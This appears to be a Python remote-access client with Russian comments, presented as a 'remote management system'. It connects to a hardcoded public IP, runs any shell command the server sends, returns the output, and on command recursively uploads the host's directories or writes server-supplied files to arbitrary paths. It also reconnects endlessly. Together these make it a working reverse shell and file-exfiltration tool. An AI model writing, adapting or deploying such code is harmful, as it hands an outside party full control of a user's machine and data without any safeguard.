"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    TCP CLIENT - СИСТЕМА УДАЛЁННОГО УПРАВЛЕНИЯ                ║
║                                Финальная версия                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

УЛУЧШЕНИЯ ВЕРСИИ 2.0:
- Глобальный буфер для корректной передачи файлов
- Защита от конкуренции за данные из сокета
- Автоматическое переподключение при разрыве

ВОЗМОЖНОСТИ:
- Выполнение команд от сервера
- Двусторонняя передача файлов (IMPORT/EXPORT)
- Автоматическое переподключение
"""

import socket
import threading
import subprocess
import os
import json
import time
import sys
from pathlib import Path

# Настройки подключения
SERVER_HOST = "44.220.46.129" # Айпи адрес сервера
SERVER_PORT = 9000 # Порт сервера
RECONNECT_DELAY = 5  # Задержка перед переподключением в секундах
MAX_RECONNECT_ATTEMPTS = 0  # 0 = бесконечные попытки
BAN_RETRY_DELAY = 1800  # 30 минут (1800 секунд) ожидание при бане

BAN_STATE_FILE = "ban_state.json"  # Файл для сохранения состояния бана

s = None
connected = False
reconnect_count = 0
is_banned = False  # Флаг бана
ban_retry_time = 0  # Время следующей попытки после бана

client_id = os.environ.get('USERNAME', 'unknown')

CHUNK_SIZE = 65536  # 64KB для передачи файлов

# НОВОЕ: Глобальный буфер для сырых данных
raw_buffer = b""
buffer_lock = threading.Lock()



def log_message(level, message):
    """Логирование с временной меткой"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {message}")


def connect_to_server():
    """Подключение к серверу с обработкой ошибок и банов"""
    global s, connected, reconnect_count, is_banned, ban_retry_time, raw_buffer

    # Проверяем, не истёк ли таймер бана
    if is_banned and time.time() < ban_retry_time:
        remaining = ban_retry_time - time.time()
        log_message("BAN",
                    f" Вы забанены. Попытка подключения возможна через {int(remaining // 60)} мин {int(remaining % 60)} сек")


    while True:
        try:
            if MAX_RECONNECT_ATTEMPTS > 0 and reconnect_count >= MAX_RECONNECT_ATTEMPTS:
                log_message("ERROR", f"Достигнут лимит попыток переподключения ({MAX_RECONNECT_ATTEMPTS})")
                return False

            log_message("INFO", f"Попытка подключения к {SERVER_HOST}:{SERVER_PORT}...")

            s = socket.socket()
            s.settimeout(10)  # Таймаут для подключения
            s.connect((SERVER_HOST, SERVER_PORT))
            s.settimeout(None)  # Убираем таймаут после подключения

            # Отправляем идентификатор
            s.sendall((client_id + "\n").encode('utf-8'))

            # Проверяем ответ сервера на предмет бана
            # Даём серверу время ответить
            s.settimeout(3)
            try:
                # Пробуем получить первые данные
                initial_data = s.recv(4096)
                if initial_data:
                    data_str = initial_data.decode('utf-8', errors='ignore')
                    with buffer_lock:
                        raw_buffer = initial_data


                s.settimeout(None)
            except socket.timeout:
                # Таймаут - значит сервер не отправил сообщение о бане
                # Это нормально для обычного подключения
                s.settimeout(None)
                pass

            connected = True
            reconnect_count = 0
            is_banned = False  # Сбрасываем флаг бана при успешном подключении
            log_message("SUCCESS", f"Подключен как: {client_id}")
            return True

        except socket.timeout:
            reconnect_count += 1
            log_message("ERROR", f"Таймаут подключения (попытка {reconnect_count})")
            time.sleep(RECONNECT_DELAY)

        except ConnectionRefusedError:
            reconnect_count += 1
            log_message("ERROR", f"Сервер недоступен (попытка {reconnect_count})")
            time.sleep(RECONNECT_DELAY)

        except Exception as e:
            reconnect_count += 1
            log_message("ERROR", f"Ошибка подключения: {e} (попытка {reconnect_count})")
            time.sleep(RECONNECT_DELAY)


def handle_disconnect():
    """Обработка разрыва соединения"""
    global connected

    connected = False
    log_message("WARNING", "Соединение разорвано")

    try:
        if s:
            s.close()
    except:
        pass

    log_message("INFO", f"Попытка переподключения через {RECONNECT_DELAY} секунд...")
    time.sleep(RECONNECT_DELAY)

    if connect_to_server():
        log_message("SUCCESS", "Успешное переподключение!")
        # Перезапускаем поток приёма
        threading.Thread(target=receive, daemon=True).start()
    else:
        log_message("CRITICAL", "Не удалось переподключиться к серверу")


def execute_command(cmd):
    """Выполняет команду и возвращает результат"""
    # Проверка на команду отмены
    if cmd == "CANCEL_TIMEOUT":
        return "️ КОМАНДА ОТМЕНЕНА ПО ТАЙМАУТУ (превышено 2 минуты)"

    if cmd == "CANCEL_MANUAL":
        return "️ КОМАНДА ОТМЕНЕНА ВРУЧНУЮ С СЕРВЕРА"

    try:
        proc = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            encoding="cp866",
            errors='replace',
            timeout=30
        )

        result = ""
        if proc.stdout:
            result += proc.stdout
        if proc.stderr:
            result += "\n[STDERR]:\n" + proc.stderr

        if not result.strip():
            result = f"Команда выполнена. Return code: {proc.returncode}"

        return result

    except subprocess.TimeoutExpired:
        return "ОШИБКА: Команда выполнялась слишком долго (timeout)"
    except Exception as e:
        return f"ОШИБКА выполнения: {type(e).__name__}: {e}"


def send_in_chunks(prefix, text, chunk_size=100):
    """Отправляет текст кусками с маркерами начала и конца"""
    lines = text.split('\n')
    total_lines = len(lines)
    chunks_sent = 0

    # Отправляем маркер начала
    s.sendall(f"{prefix}:START:{total_lines}\n".encode('utf-8'))

    # Отправляем по chunk_size строк за раз
    for i in range(0, len(lines), chunk_size):
        chunk = lines[i:i + chunk_size]
        chunk_text = '\n'.join(chunk)

        # Экранируем перевод строк для передачи
        chunk_clean = chunk_text.replace('\n', '<<<NL>>>')

        s.sendall(f"{prefix}:CHUNK:{chunk_clean}\n".encode('utf-8', errors='replace'))
        chunks_sent += 1

    # Отправляем маркер конца
    s.sendall(f"{prefix}:END\n".encode('utf-8'))
    print(f"[{prefix}] Отправлено {total_lines} строк ({chunks_sent} кусков). Конец передачи.")


def list_files_recursive(path):
    """Рекурсивный список файлов"""
    path = Path(path)
    files = []

    if not path.exists():
        return []

    if path.is_file():
        return [{"path": str(path), "rel_path": path.name, "size": path.stat().st_size}]

    for item in path.rglob("*"):
        if item.is_file():
            try:
                rel_path = item.relative_to(path)
                files.append({
                    "path": str(item),
                    "rel_path": str(rel_path),
                    "size": item.stat().st_size
                })
            except Exception as e:
                print(f" Ошибка при обработке {item}: {e}")

    return files


def send_file_data(file_path, rel_path, size):
    """Отправка данных одного файла"""
    try:
        # Отправляем метаданные файла
        meta = json.dumps({
            "rel_path": rel_path,
            "size": size
        })
        s.sendall(f"FILE:META:{meta}\n".encode('utf-8'))

        # Отправляем содержимое файла
        sent = 0
        with open(file_path, "rb") as f:
            while chunk := f.read(CHUNK_SIZE):
                s.sendall(chunk)
                sent += len(chunk)
                progress = sent * 100 // size if size > 0 else 100
                print(f"\r  {rel_path}: {progress}% ", end="", flush=True)

        print(f"\r  ✓ {rel_path} ({size / 1024:.1f} KB)")

        # Подтверждение окончания файла
        s.sendall(b"FILE:END\n")
        return True

    except Exception as e:
        print(f" Ошибка отправки {rel_path}: {e}")
        return False


def export_files(source_path, dest_dir):
    """Экспорт файлов на сервер (клиент отправляет)"""
    try:
        print(f"[DEBUG] Начало экспорта: {source_path}")

        if not os.path.exists(source_path):
            error_msg = f"ОШИБКА: Путь не существует: {source_path}"
            print(error_msg)
            s.sendall(f"EXPORT:ERROR:{error_msg}\n".encode('utf-8'))
            return

        print(f"[DEBUG] Путь существует, сканируем файлы...")
        files = list_files_recursive(source_path)

        if not files:
            error_msg = f"ОШИБКА: Нет файлов для передачи в {source_path}"
            print(error_msg)
            s.sendall(f"EXPORT:ERROR:{error_msg}\n".encode('utf-8'))
            return

        print(f"[DEBUG] Найдено файлов: {len(files)}")

        # Отправляем начало экспорта с метаданными
        metadata = {
            "count": len(files),
            "dest_dir": dest_dir,
            "source": str(Path(source_path).name)
        }
        meta_str = json.dumps(metadata)
        print(f"[DEBUG] Отправка метаданных: {meta_str}")
        s.sendall(f"EXPORT:START:{meta_str}\n".encode('utf-8'))

        total_size = sum(f["size"] for f in files)
        print(f" Экспорт {len(files)} файлов ({total_size / 1024 / 1024:.2f} MB)")

        # Отправляем каждый файл
        for i, file_info in enumerate(files, 1):
            print(f"[DEBUG] Отправка файла {i}/{len(files)}: {file_info['rel_path']}")
            if not send_file_data(file_info["path"], file_info["rel_path"], file_info["size"]):
                s.sendall(b"EXPORT:ABORT\n")
                print(" Экспорт прерван из-за ошибки")
                return

        # Подтверждение завершения
        s.sendall(b"EXPORT:COMPLETE\n")
        print(" Экспорт завершён")

    except Exception as e:
        error_msg = f"Критическая ошибка экспорта: {e}"
        print(f" {error_msg}")
        import traceback
        traceback.print_exc()
        s.sendall(f"EXPORT:ERROR:{error_msg}\n".encode('utf-8'))


class ImportState:
    """Класс для хранения состояния импорта"""

    def __init__(self):
        self.active = False
        self.metadata = None
        self.files_received = 0
        self.current_file_meta = None
        self.waiting_for = None  # 'file_meta' или 'file_data'


import_state = ImportState()


def read_exact_bytes(size):
    """НОВАЯ ФУНКЦИЯ: Читает точное количество байт из глобального буфера"""
    global raw_buffer

    with buffer_lock:
        # Читаем из буфера, пока не получим нужное количество
        while len(raw_buffer) < size:
            buffer_lock.release()  # Освобождаем блокировку на время чтения из сокета
            try:
                chunk = s.recv(min(CHUNK_SIZE, size - len(raw_buffer)))
                if not chunk:
                    raise ConnectionError("Разрыв соединения")
            finally:
                buffer_lock.acquire()  # Снова захватываем блокировку

            raw_buffer += chunk

        # Извлекаем нужное количество байт
        data = raw_buffer[:size]
        raw_buffer = raw_buffer[size:]
        return data


def read_line_from_buffer():
    """НОВАЯ ФУНКЦИЯ: Читает строку из глобального буфера"""
    global raw_buffer

    with buffer_lock:
        while b'\n' not in raw_buffer:
            buffer_lock.release()
            try:
                chunk = s.recv(4096)
                if not chunk:
                    raise ConnectionError("Разрыв соединения")
            finally:
                buffer_lock.acquire()

            raw_buffer += chunk

        line, raw_buffer = raw_buffer.split(b'\n', 1)
        return line.decode('utf-8', errors='ignore').strip()


def start_import(metadata_line):
    """Начинает процесс импорта"""
    try:
        print(f"[DEBUG] Начало импорта: {metadata_line}")

        if not metadata_line.startswith("IMPORT:START:"):
            print(f" Неожиданный формат: {metadata_line}")
            return False

        meta_str = metadata_line[13:]
        print(f"[DEBUG] Метаданные: {meta_str}")

        metadata = json.loads(meta_str)

        count = metadata["count"]
        dest_dir = metadata.get("dest_dir", "received")
        source = metadata.get("source", "unknown")

        print(f" Импорт {count} файлов из '{source}' в '{dest_dir}'")

        # Сохраняем состояние
        import_state.active = True
        import_state.metadata = metadata
        import_state.files_received = 0
        import_state.waiting_for = 'file_meta'

        return True

    except Exception as e:
        print(f" Ошибка начала импорта: {e}")
        import traceback
        traceback.print_exc()
        return False


def process_file_meta(msg):
    """Обрабатывает метаданные файла"""
    try:
        if not msg.startswith("FILE:META:"):
            print(f" Ожидался FILE:META, получено: {msg}")
            return False

        file_meta = json.loads(msg[10:])
        rel_path = file_meta["rel_path"]
        size = file_meta["size"]

        print(f"[DEBUG] Получение файла: {rel_path} ({size} bytes)")

        # Создаём путь для сохранения
        dest_dir = import_state.metadata.get("dest_dir", "received")
        dest_path = Path(dest_dir)

        # Проверяем, является ли dest_dir файлом (имеет расширение) или директорией
        if import_state.metadata["count"] == 1 and dest_path.suffix:
            save_path = dest_path
            print(f"[DEBUG] Сохранение в указанный файл: {save_path}")
        else:
            save_path = dest_path / rel_path
            print(f"[DEBUG] Сохранение в директорию: {save_path}")

        # Создаём директорию
        save_path.parent.mkdir(parents=True, exist_ok=True)

        # НОВОЕ: Получаем файл используя read_exact_bytes
        print(f"[DEBUG] Начало чтения {size} байт...")
        received = 0
        with open(save_path, "wb") as f:
            while received < size:
                to_read = min(CHUNK_SIZE, size - received)
                chunk = read_exact_bytes(to_read)
                f.write(chunk)
                received += len(chunk)
                progress = received * 100 // size if size > 0 else 100
                print(f"\r  {save_path.name}: {progress}% ", end="", flush=True)

        print(f"\r  ✓ {save_path.name} ({size / 1024:.1f} KB)")

        # Читаем маркер FILE:END
        end_marker = read_line_from_buffer()
        if not end_marker.startswith("FILE:END"):
            print(f" Неожиданный маркер: {end_marker}")

        import_state.files_received += 1

        # Проверяем, все ли файлы получены
        if import_state.files_received >= import_state.metadata["count"]:
            s.sendall(b"IMPORT:COMPLETE\n")
            print(" Импорт завершён")
            import_state.active = False
        else:
            import_state.waiting_for = 'file_meta'

        return True

    except Exception as e:
        print(f" Ошибка обработки метаданных файла: {e}")
        import traceback
        traceback.print_exc()
        s.sendall(f"IMPORT:ERROR:{e}\n".encode('utf-8'))
        import_state.active = False
        return False


def receive():
    """Получение данных от сервера с обработкой разрыва соединения"""
    global raw_buffer

    while True:
        try:
            if not connected:
                log_message("INFO", "Ожидание восстановления соединения...")
                time.sleep(1)
                continue

            # ИЗМЕНЕНО: Используем read_line_from_buffer для текстовых сообщений
            msg = read_line_from_buffer()

            if not msg:
                continue

            # Если идёт процесс импорта и ожидаем метаданные файла
            if import_state.active and import_state.waiting_for == 'file_meta':
                if msg.startswith("FILE:META:"):
                    process_file_meta(msg)
                    continue

            # Команда EXPORT (клиент отправляет файлы на сервер)
            if msg.startswith("EXPORT;"):
                # Формат: EXPORT;source_path;dest_dir
                parts = msg[7:].split(";", 1)
                if len(parts) < 2:
                    s.sendall("EXPORT:ERROR:Неверный формат\n".encode())
                    continue

                source_path = parts[0].strip()
                dest_dir = parts[1].strip() if len(parts) > 1 else "received"

                export_files(source_path, dest_dir)
                continue

            # Команда IMPORT (клиент получает файлы с сервера)
            elif msg.startswith("IMPORT:START:"):
                log_message("INFO", "Получена команда IMPORT")
                start_import(msg)
                continue

            elif msg.startswith("FILETRU:"):
                cmd = msg[8:].strip()
                log_message("CMD", f"FILETRU: {cmd}")

                result = execute_command(cmd)
                send_in_chunks("FILETRU", result, chunk_size=100)
                continue

            elif msg.startswith("CMD:"):
                cmd = msg[4:].strip()
                log_message("CMD", f"CMD: {cmd}")

                result = execute_command(cmd)
                send_in_chunks("OUTPUT", result, chunk_size=100)
                continue
            elif msg.startswith("KICK:"):
                reason = msg[5:].strip() if len(msg) > 5 else "Вы были отключены"
                log_message("KICK", reason)
                log_message("INFO", "Сессия завершена сервером")
                try:
                    s.close()
                except:
                    pass
                sys.exit(0)
            elif msg == "SERVER_SHUTDOWN":
                log_message("INFO", "Сервер остановлен")
                s.close()
                break

            else:
                print(f"\n{msg}\n> ", end="")

        except ConnectionResetError:
            log_message("ERROR", "Соединение сброшено сервером")
            handle_disconnect()
            break
        except BrokenPipeError:
            log_message("ERROR", "Broken pipe - соединение разорвано")
            handle_disconnect()
            break
        except Exception as e:
            log_message("ERROR", f"Ошибка получения данных: {e}")
            import traceback
            traceback.print_exc()
            handle_disconnect()
            break


# ═══════════════════════════════════════════════════════════════════════════
# ЗАПУСК КЛИЕНТА
# ═══════════════════════════════════════════════════════════════════════════


# Подключаемся к серверу
if not connect_to_server():
    log_message("CRITICAL", "Не удалось подключиться к серверу. Выход.")
    sys.exit(1)

# Запускаем поток приёма
threading.Thread(target=receive, daemon=True).start()

# Основной цикл ввода
while True:
    try:
        if not connected:
            log_message("WARNING", "Нет соединения с сервером. Ожидание...")
            time.sleep(1)
            continue

        msg = input("> ")

        if not msg.strip():
            continue

        try:
            s.sendall((msg + "\n").encode('utf-8'))
        except BrokenPipeError:
            log_message("ERROR", "Не удалось отправить сообщение - соединение разорвано")
            handle_disconnect()
        except Exception as e:
            log_message("ERROR", f"Ошибка отправки: {e}")
            handle_disconnect()

    except KeyboardInterrupt:
        log_message("INFO", "Завершение работы (Ctrl+C)")
        break
    except Exception as e:
        log_message("ERROR", f"Неожиданная ошибка: {e}")
        break

# Закрываем соединение
try:
    if s:
        s.close()
except:
    pass

log_message("INFO", "Клиент остановлен")
